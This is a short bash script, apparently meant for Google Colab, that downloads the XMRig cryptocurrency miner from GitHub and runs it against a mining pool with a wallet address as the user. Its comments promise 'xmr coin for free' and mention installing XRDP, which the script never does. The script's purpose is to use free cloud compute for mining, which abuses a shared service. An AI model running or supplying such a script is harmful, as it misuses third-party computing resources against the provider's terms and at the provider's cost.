#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
xmrig -a ghostrider --url stratum-asia.rplant.xyz:17075 --tls --user b4df2e71da5bcd06e2fc341330b52eda8ce909f4e38275b80682ad4aa0acd3e5.test

